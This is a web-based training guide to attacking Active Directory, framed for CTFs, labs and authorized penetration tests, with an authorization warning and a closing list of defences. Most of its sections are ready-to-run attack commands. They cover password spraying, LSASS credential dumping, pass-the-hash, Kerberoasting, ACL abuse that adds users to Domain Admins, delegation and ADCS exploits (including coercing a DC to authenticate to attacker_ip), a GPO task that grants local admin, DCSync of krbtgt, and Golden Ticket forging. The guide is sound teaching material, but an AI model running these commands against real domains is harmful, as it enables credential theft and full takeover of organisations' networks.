🛡️ Active Directory Attack Academy

A deep, structured, interactive reference guide for learning Active Directory enumeration, attack paths, and privilege escalation. From fundamentals to advanced techniques — built for CTFs, labs, and authorized security validation.

🔍 Enumeration

PowerView, BloodHound, SharpHound, LDAP queries, trusts, ACLs, shares, and sessions.

⚔️ Attack Paths

Kerberoasting, AS-REP, ACL abuse, delegation, ADCS, DCSync, Golden Tickets, and more.

How to use this guide: Start with the AD fundamentals, then work through enumeration. Every technique explains why it works, what to enumerate, how to validate, and how to exploit in a lab.
🧠 The Core Mental Model

Active Directory is a graph of relationships. Privilege escalation is about finding a path from your user to Domain Admin through those relationships:

"What permissions do I have over other objects, and how do they chain to Domain Admin?"

⚠️ Authorized Use Only

All techniques in this guide are for:

  • Your own AD lab environments (GOAD, DetectionLab, etc.)
  • CTF platforms with AD challenges (HTB, TryHackMe)
  • Authorized penetration testing engagements
  • Systems where you have explicit written authorization

Do not use these techniques against production Active Directory environments without authorization. AD attacks can be destructive — they can lock accounts, break services, and cause outages.

About exploitation commands: This guide includes lab-only exploitation steps in clearly marked Exploitation blocks. Use them only in authorized lab environments.

🧠 AD Attack Mindset

AD is a graph, not a list. Every user, group, computer, and GPO is a node. Every permission, trust, and session is an edge. Attacks are paths through that graph.

Chain findings. From user → server admin → domain admin → forest admin.

Eight Questions for Every AD Finding

  1. What object do I control? — My user, group, or computer?
  2. What permissions do I have? — Over which other objects?
  3. What does that permission grant? — Read? Write? Control?
  4. Can I exploit it directly? — Or do I need a chain?
  5. What's the target's privilege level? — User? Server Admin? DA?
  6. Is the target logged in? — Sessions matter for lateral movement.
  7. What's the timing? — Immediate? On reboot? On login?
  8. Can I reliably reach Domain Admin? — Or do I need pivoting?
🧠 Why this matters

AD attacks are about chaining small permissions. A single "GenericWrite" over a user is not Domain Admin — but combined with Kerberoasting, it is.

📘 AD Fundamentals

You can't attack what you don't understand. AD is a directory service that stores objects and their relationships.

Core Concepts

ConceptWhat it is
DomainA logical grouping of users, computers, and resources under a common directory database.
ForestA collection of one or more domains that share a common schema and global catalog.
Domain Controller (DC)A server that hosts the AD database and authenticates users.
LDAPProtocol for querying and modifying AD.
KerberosThe default authentication protocol for AD.
NTLMLegacy authentication protocol — still used in many environments.
SIDSecurity Identifier — unique identifier for every object.
ACLAccess Control List — permissions on objects.
GPOGroup Policy Object — configuration applied to users/computers.

Key AD Objects

  • User — accounts
  • Group — collections of users (Domain Admins, Enterprise Admins)
  • Computer — machine accounts
  • OU — Organizational Unit — container for objects
  • GPO — Group Policy Objects — configuration
  • Trust — relationship between domains/forests

🧠 Never skip enumeration

In AD, the enumeration phase determines 90% of your attack success. BloodHound paths, ACLs, and Kerberos tickets are all in the data — you just need to find them.

🔍 AD Enumeration Overview

Enumeration is everything in AD. The attack path is almost always in the data — you just have to find it.
What

Discovering users, groups, computers, trusts, ACLs, sessions, shares, and GPOs.

Why

Every escalation path starts with an enumeration finding. Without it, you're guessing.

How

Use PowerView, BloodHound, SharpHound, ldapsearch, and native Windows tools.

When

Immediately after gaining a foothold — even a low-priv domain user account is enough.

Key Enumeration Targets

  • Users — who exists, who is admin, who has SPNs, who has "Do not require Kerberos preauth"
  • Groups — Domain Admins, Enterprise Admins, nested groups
  • Computers — DCs, servers, workstations, OS versions
  • Trusts — parent/child, external, forest trusts
  • ACLs — who has GenericAll, WriteDACL, WriteOwner, ForceChangePassword on what
  • Sessions — who is logged into which machine (for lateral movement)
  • Shares — SMB shares, permissions, interesting files
  • GPOs — who can modify them, what they apply to
  • ADCS — certificate templates, CAs, ESC1–ESC8
  • Delegation — unconstrained, constrained, RBCD

⚡ PowerView / SharpHound Enumeration

🟢 Reliable — core AD enumeration
What

PowerView is a PowerShell tool for AD enumeration; SharpHound is its C# counterpart used by BloodHound.

Why

Provides structured access to every AD object and its permissions.

How

Import the module, then use cmdlets like Get-DomainUser, Get-DomainGroup, Find-InterestingDomainAcl.

When

As soon as you have any domain credentials.

PowerShell
# Import PowerView
. .\PowerView.ps1

# Enumerate domain users
Get-DomainUser | Select-Object samaccountname,description,memberof

# Enumerate domain groups
Get-DomainGroup | Select-Object samaccountname,description

# Enumerate computers
Get-DomainComputer | Select-Object dnshostname,operatingsystem

# Find users with SPNs (Kerberoastable)
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Find users with "Do not require Kerberos preauth" (AS-REP roastable)
Get-DomainUser -PreauthNotRequired

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN,IdentityReferenceName,ActiveDirectoryRights

# Find domain trusts
Get-DomainTrust

# Find local admins on a machine
Find-LocalAdminAccess

SharpHound (for BloodHound)

CMD
# Collect all AD data into a zip for BloodHound
SharpHound.exe -c All

# Or with stealth options
SharpHound.exe -c All --Stealth

🩸 BloodHound

BloodHound visualizes AD attack paths. It shows you exactly how to get from your user to Domain Admin using the data collected by SharpHound.
What

A graph-based tool that ingests SharpHound data and shows attack paths.

Why

Manual enumeration misses paths. BloodHound finds the shortest path from any user to DA.

How

Collect with SharpHound, import into BloodHound, then run built-in queries.

When

As soon as you have AD credentials — it's the fastest way to find paths.

Key BloodHound Queries

  • Shortest Paths to Domain Admins — from your user
  • Kerberoastable Users — users with SPNs
  • AS-REP Roastable Users — users without preauth
  • Users with DCSync Rights — who can DCSync
  • Unconstrained Delegation — computers/users with it
  • Computers Where Domain Admins Are Logged In — for lateral movement
  • Shortest Paths to High Value Targets — from any owned principal
🎯 Lab Exploitation — BloodHound Workflow
CMD
# 1. Collect data on target
SharpHound.exe -c All --zipfilename loot.zip

# 2. Transfer loot.zip to your attack machine
# 3. Import into BloodHound GUI
# 4. Mark your user as Owned
# 5. Run "Shortest Path to Domain Admins" query
# 6. Follow the path — BloodHound shows every edge and technique

👤 Users & Groups

What

AD user accounts and group memberships.

Why

Users with SPNs are Kerberoastable. Users with preauth disabled are AS-REP roastable. Admin groups are the target.

How

Get-DomainUser, net user /domain, Get-ADUser, ldapsearch.

When

First step of AD enumeration.

PowerShell
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# PowerView
Get-DomainUser
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty member

💻 Computers & Trusts

PowerShell
# Computers
Get-DomainComputer | Select-Object dnshostname,operatingsystem,lastlogontimestamp

# Domain Controllers
Get-DomainController

# Trusts
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts

📁 Shares & Sessions

PowerShell
# Find shares on computers
Find-DomainShare -CheckShareAccess

# Find interesting files in shares
Find-InterestingDomainShareFile

# Find where users are logged in
Find-DomainUserLocation

# Find local admin access
Find-LocalAdminAccess

NetExec / CrackMapExec

Linux
netexec smb 10.10.10.0/24 -u user -p pass --shares
netexec smb 10.10.10.0/24 -u user -p pass --sessions
netexec smb 10.10.10.0/24 -u user -p pass --loggedon-users

🔑 Credential Attacks

Credentials are the currency of AD. Every step forward is unlocked by a new credential — a password, a hash, or a ticket.
What

Obtaining credentials: password spraying, brute force, hash extraction, ticket theft.

Why

A new credential unlocks new permissions, new sessions, and new attack paths.

How

CrackMapExec, NetExec, Kerbrute, Mimikatz, secretsdump, Responder, Impacket.

Caution

Password spraying can lock accounts. Always check the lockout policy first.

Password Spraying

Linux
# Check lockout policy first!
netexec smb DC01 -u user -p pass --pass-pol

# Spray with a single password against many users
netexec smb DC01 -u users.txt -p 'Summer2024!' --continue-on-success

# Kerbrute for user enumeration and spraying
kerbrute userenum --dc DC01 -d domain.local users.txt
kerbrute passwordspray --dc DC01 -d domain.local users.txt 'Password123!'

Hash Extraction (from a compromised host)

Windows
# Dump SAM and LSA (local hashes)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit

# Dump LSASS to a file for offline analysis
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# On Linux, extract from dumps
pypykatz lsa minidump lsass.dmp
🎯 Lab Exploitation — Pass-the-Hash

If you have an NTLM hash, you can authenticate without cracking it:

Linux
netexec smb DC01 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --shares
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@DC01

🎟️ Kerberos Attacks

Kerberos is the default AD authentication protocol. Many AD attacks abuse specific Kerberos behaviors — pre-auth, SPNs, delegation, and ticket lifetimes.
What

Attacks on Kerberos: AS-REP Roasting, Kerberoasting, Golden/Silver Tickets, delegation abuse.

Why

Kerberos tickets contain credential material. If you can request them, you can crack them.

How

Impacket (GetUserSPNs, GetNPUsers), Rubeus, Mimikatz.

When

After enumeration finds SPNs or preauth-disabled accounts.

🔓 AS-REP Roasting

🟢 Reliable — if users have preauth disabled
What

Users with "Do not require Kerberos preauthentication" can have their AS-REP response requested without credentials.

Why

The AS-REP contains a hash encrypted with the user's password. You can crack it offline.

How

GetNPUsers.py (Impacket) or Rubeus asreproast.

When

After Get-DomainUser -PreauthNotRequired returns accounts.

Linux
# Without any credentials
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# With a valid user
GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile asrep.txt

Exploitability Checklist

✓ Verify before exploiting [✓] One or more users have "Do not require Kerberos preauth"
[✓] You can request AS-REP without credentials (or with a valid user)
[✓] You can crack the hash offline (hashcat mode 18200)
[✓] The user has meaningful privileges
🎯 Lab Exploitation — Crack and Use
Linux
hashcat -m 18200 asrep.txt rockyou.txt
# Once cracked, use the password to authenticate
netexec smb DC01 -u asrepuser -p cracked_password

🔥 Kerberoasting

🟢 Reliable — if SPN accounts exist
What

Request a service ticket (TGS) for any account with an SPN. The ticket is encrypted with the account's NTLM hash.

Why

You can crack the TGS offline. Service accounts often have weak passwords and high privileges.

How

GetUserSPNs.py (Impacket) or Rubeus kerberoast.

When

After enumeration shows users with SPNs.

Linux
GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt

Exploitability Checklist

✓ Verify before exploiting [✓] One or more users have SPNs set
[✓] You have any valid domain user credentials
[✓] The SPN account password is crackable
[✓] The SPN account has meaningful privileges
🎯 Lab Exploitation — Kerberoast and Crack
Linux
GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt
# Once cracked:
netexec smb DC01 -u svc_account -p cracked_password

📋 ACL Abuse

🟢 Reliable — if ACL grants meaningful rights
ACLs are the edges of the AD graph. Almost every privilege escalation path in AD goes through an ACL.
What

Permissions on AD objects that, when misconfigured, allow a low-priv user to control a higher-priv object.

Why dangerous

Example: if you have GenericAll over a Domain Admin user, you can reset their password.

How

BloodHound finds them; Find-InterestingDomainAcl enumerates them.

When

After BloodHound or PowerView enumeration.

Dangerous ACLs

ACLWhat it allows
GenericAllFull control — reset password, add to group, modify
GenericWriteModify attributes — set SPN, logon script
WriteDACLGrant yourself any permission
WriteOwnerTake ownership, then modify
ForceChangePasswordReset another user's password
AddMemberAdd yourself to a group
AllExtendedRightsIncludes ForceChangePassword, DCSync
DCSyncReplicate AD data — extract any user's hash

Exploitability Checklist

✓ Verify before exploiting [✓] You have a dangerous ACL over a higher-priv object
[✓] The ACL is effective (not blocked by inheritance or deny)
[✓] The target object has meaningful privilege
[✓] You can reach the object (network, LDAP access)
🎯 Lab Exploitation — GenericAll over a user
Linux
# Reset the target's password via PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)

# Or via bloodyAD (Linux)
bloodyAD -u user -p pass -d domain.local --host DC01 set password targetuser 'NewP@ssw0rd!'
Lab Exploitation — GenericAll over a group
PowerShell
Add-DomainGroupMember -Identity "Domain Admins" -Members youruser
Lab Exploitation — WriteDACL over a group
PowerShell
# Grant yourself DCSync rights on the domain
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync

# Then DCSync
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit
Lab Exploitation — ForceChangePassword
Linux
net rpc password targetuser 'NewP@ssw0rd!' -U domain.local/user%password -S DC01
Lab Exploitation — WriteOwner
PowerShell
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity youruser
# Now you own the object and can modify its ACL
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

🎫 Delegation

Delegation lets a service act on behalf of a user. Misconfigured delegation allows you to impersonate users — including Domain Admins.
What

Three types: Unconstrained, Constrained, Resource-Based Constrained Delegation (RBCD).

Why dangerous

Unconstrained delegation caches TGTs of users who connect. RBCD lets you impersonate any user to a target service.

How

Get-DomainComputer -Unconstrained, BloodHound "Unconstrained Delegation" query.

When

After enumeration reveals delegation configuration.

Exploitability Checklist

✓ Verify before exploiting [✓] A computer or user has delegation configured
[✓] You can coerce a privileged user to authenticate
[✓] OR you can modify the target's msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)
[✓] You have a machine account (or can create one)
🎯 Lab Exploitation — Unconstrained Delegation
PowerShell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# If you compromise such a machine and a DA connects, extract the TGT
Rubeus.exe monitor /interval:5 /nowrap
# Or dump cached tickets:
mimikatz.exe "sekurlsa::tickets /export" exit

# Inject the extracted TGT
Rubeus.exe ptt /ticket:base64ticket
Lab Exploitation — RBCD
Linux
# 1. Create a machine account (if MachineAccountQuota > 0)
addcomputer.py -computer-name EVIL$ -computer-pass Password123 domain.local/user:pass -dc-ip DC01

# 2. Set RBCD on target computer
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/user:pass -dc-ip DC01

# 3. Get a service ticket impersonating Administrator
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/'EVIL$':Password123

# 4. Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass TARGET.domain.local

📜 ADCS Abuse

🟢 Reliable — if vulnerable templates exist
ADCS is the second-most common AD escalation path after ACLs. Misconfigured certificate templates can grant Domain Admin.
What

Active Directory Certificate Services issues certificates for authentication. Misconfigured templates allow impersonation.

Why dangerous

ESC1–ESC8 vulnerabilities can grant Domain Admin, or allow certificate theft leading to persistent access.

How

Certipy, Certify, BloodHound (with ADCS integration).

When

After enumeration shows a CA and templates.

Common ADCS Attack Types

TypeDescription
ESC1Template allows requester to specify SAN (enroll as any user)
ESC2Template allows any purpose (including client auth)
ESC3Enrollment agent template abuse
ESC4Writable template — modify to enable ESC1
ESC5Writable PKI objects (CA, templates, etc.)
ESC6CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
ESC7CA officer rights (ManageCA, ManageCertificates)
ESC8NTLM relay to HTTP enrollment endpoint

Exploitability Checklist

✓ Verify before exploiting [✓] A CA is present and reachable
[✓] A vulnerable template exists (ESC1–ESC8)
[✓] You can enroll for that template (with your user or a compromised account)
[✓] The template allows client authentication
🎯 Lab Exploitation — ESC1
Linux
# 1. Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip DC01 -vulnerable

# 2. Request certificate with Administrator SAN
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@domain.local

# 3. Authenticate using the certificate
certipy auth -pfx administrator.pfx -dc-ip DC01
# You'll get Administrator's NTLM hash
Lab Exploitation — ESC8
Linux
# Relay a DC's NTLM auth to the ADCS HTTP endpoint
certipy relay -target http://CA.domain.local/certsrv/certfnsh.asp -template DomainController
# Coerce a DC to authenticate (PetitPotam, PrinterBug)
petitpotam.py attacker_ip DC01

📝 GPO Abuse

What

Group Policy Objects apply configuration to users/computers. Writable GPOs can be abused to push malicious settings.

Why dangerous

If you can modify a GPO linked to an OU containing privileged users, you can push logon scripts, scheduled tasks, or privilege grants.

How

PowerView Get-DomainGPO, Get-GPOReport, SharpGPOAbuse.

When

After enumeration reveals writable GPOs.

🎯 Lab Exploitation — GPO with Immediate Task
PowerShell
# Find GPOs you can modify
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "Write" }

# Use SharpGPOAbuse to add an immediate scheduled task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net localgroup administrators user /add" --GPOName "Vulnerable GPO"

# Force policy update
gpupdate /force

🔗 Domain Trusts

What

Trusts connect domains/forests, allowing users in one to access resources in another.

Why dangerous

Trust relationships can extend your attack surface. Compromising a child domain can lead to parent domain compromise.

How

Get-DomainTrust, nltest /domain_trusts.

When

After compromising a domain — check if you can pivot to another.

🎯 Lab Exploitation — SID History Abuse
PowerShell
# If you have DA in child domain and SID filtering is disabled on the trust
# Inject Enterprise Admins SID into your user's SID History
mimikatz.exe "sid::patch" "sid::add /sam:youruser /new:EnterpriseAdminsSID" exit

# Now your user is effectively Enterprise Admin
dir \\parent-dc\c$
Lab Exploitation — Trust Key Extraction
CMD
# Extract trust key from a DC
mimikatz.exe "lsadump::trust /patch" exit

# Use the trust key to create an inter-realm TGT
mimikatz.exe "kerberos::golden /domain:child.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /rc4:TRUSTKEY /user:Administrator /service:krbtgt /target:parent.local /ticket:inter_realm.kirbi" exit

👑 DCSync

🟢 Reliable — if you have DCSync rights
DCSync mimics a Domain Controller to request password hashes from AD. If you have the right permissions, you can extract any user's hash — including krbtgt.
What

DCSync abuses the Directory Replication Service (DRS) protocol to replicate password hashes.

Why dangerous

Extracting krbtgt's hash lets you forge Golden Tickets — full domain compromise.

How

Mimikatz lsadump::dcsync, Impacket secretsdump.py.

When

When you have DCSync rights (Replicating Directory Changes, Replicating Directory Changes All).

Exploitability Checklist

✓ Verify before exploiting [✓] Your user has Replicating Directory Changes + All
[✓] You can reach the DC over network
[✓] No firewall blocks DRS
[✓] You understand the impact (this is a serious action)
🎯 Lab Exploitation — DCSync krbtgt
Linux
secretsdump.py domain.local/user:password@DC01 -just-dc-user krbtgt

# Or all users:
secretsdump.py domain.local/user:password@DC01 -just-dc
Lab Exploitation — Mimikatz DCSync
CMD
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" exit

🥇 Golden / Silver Tickets

Golden Tickets are forged TGTs. With the krbtgt hash, you can create a TGT for any user, valid for any service, for any duration.
Golden Ticket

Forged TGT using krbtgt's hash. Grants access to any service in the domain.

Silver Ticket

Forged TGS using a service account's hash. Grants access to that specific service only.

How

Mimikatz kerberos::golden.

Persistence

Golden Tickets survive password resets — only krbtgt reset (twice) invalidates them.

🎯 Lab Exploitation — Golden Ticket
CMD
# 1. Get the domain SID
whoami /user   # Remove the last -RID

# 2. Create a Golden Ticket with the krbtgt hash
mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /ptt" exit

# 3. Access any resource
dir \\DC01\c$
psexec.exe \\DC01 cmd.exe
Lab Exploitation — Silver Ticket
CMD
mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-XXXX /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt" exit
dir \\server.domain.local\c$

↔️ Lateral Movement

What

Moving from one compromised host to another using valid credentials, hashes, or tickets.

Why

Domain Admin credentials are often only usable on specific hosts. You need to move to where they're valid.

How

PsExec, WMI, WinRM, RDP, SMB, scheduled tasks.

When

After obtaining credentials or hashes for another host.

Linux
# Pass-the-Hash with different tools
psexec.py -hashes :NTHASH user@target
wmiexec.py -hashes :NTHASH user@target
smbexec.py -hashes :NTHASH user@target
atexec.py -hashes :NTHASH user@target "whoami"

# With WinRM
evil-winrm -i target -u user -H NTHASH

# With RDP
xfreerdp /u:user /p:password /v:target
🎯 Lab Exploitation — PsExec
Linux
psexec.py domain.local/Administrator:password@target.domain.local

🔒 Persistence

What

Maintaining access after initial compromise — even if passwords are changed.

Why

Persistence is what separates a one-time compromise from a long-term foothold.

How

Golden Tickets, Silver Tickets, Skeleton Key, DSRM, AdminSDHolder, SID History.

When

After achieving DA — before the engagement ends.

"Kerberoasting returns no hashes."

The account may have AES-only encryption (harder to crack), or no service accounts have SPNs. Check Get-DomainUser -SPN first.

"DCSync fails with access denied."

You need Replicating Directory Changes AND Replicating Directory Changes All. Check with BloodHound or Get-DomainObjectAcl -ResolveGUIDs.

"BloodHound shows no paths."

Either the environment is hardened (no paths from your user), or SharpHound collection was incomplete. Verify collection with -c All.

"ADCS certipy returns 'no vulnerabilities found'."

The templates may be properly configured, or you may lack permission to view them. Check from a DA account if possible in lab.

"NTLM relay fails."

SMB signing may be enforced, or the target may require Kerberos. Check with netexec smb --gen-relay-list.

"Golden Ticket doesn't grant access."

Check: (1) SID correctness, (2) krbtgt hash correctness, (3) time sync, (4) target service accepts Kerberos. Reset your TGT cache with klist purge.

❓ Final Knowledge Check

1. What is the difference between Kerberoasting and AS-REP Roasting?

Kerberoasting: Requesting a service ticket (TGS) for an account with an SPN — requires any valid domain user. AS-REP Roasting: Requesting an AS-REP for accounts with preauthentication disabled — can be done without credentials.

2. You have a low-priv domain user. What are the first 5 things you enumerate?

1. All domain users and their properties. 2. Domain groups, especially Domain Admins. 3. Users with SPNs (Kerberoastable). 4. Users without preauth (AS-REP roastable). 5. BloodHound collection — the graph is the fastest way to find paths.

3. What is DCSync and when can you perform it?

DCSync mimics a Domain Controller using the DRS protocol to replicate AD data — including password hashes. You can perform it if you have Replicating Directory Changes and Replicating Directory Changes All permissions (or the Replicating Directory Changes in Filtered Set extended right).

4. Why is the krbtgt account so important?

krbtgt is the Kerberos service account for the KDC. Its NTLM hash is used to encrypt TGTs. If you have the krbtgt hash, you can forge Golden Tickets — unlimited, persistent access to any service in the domain.

5. What is RBCD and how does it differ from unconstrained delegation?

RBCD (Resource-Based Constrained Delegation): Set on the target resource — you control who can delegate to this service. Exploitable if you can write msDS-AllowedToActOnBehalfOfOtherIdentity. Unconstrained Delegation: Set on a service — it caches the TGT of any user who authenticates to it. Exploited by compromising that service and capturing a DA's TGT.

6. What are ESC1 and ESC8 in ADCS?

ESC1: A template allows the requester to specify a SAN (Subject Alternative Name) — you can request a certificate for any user, including Domain Admin. ESC8: NTLM relay to the ADCS HTTP enrollment endpoint — coercing a DC to authenticate lets you get a DC certificate.

7. Describe a realistic AD chain using three findings.

Example: (1) A service account has an SPN → Kerberoast it. (2) Crack its password offline. (3) That service account has GenericAll over the Domain Admins group → Add yourself to Domain Admins → Domain Admin.

8. What defensive measures would you recommend to a customer?

1. Strong passwords on service accounts (25+ chars) or gMSAs. 2. Enforce Kerberos preauth on all accounts. 3. Audit and minimize ACLs. 4. Disable NTLM where possible. 5. Restrict DCSync rights. 6. Harden ADCS templates. 7. Monitor AD events (4768, 4769, 4662, 5136). 8. Use tiered admin model.
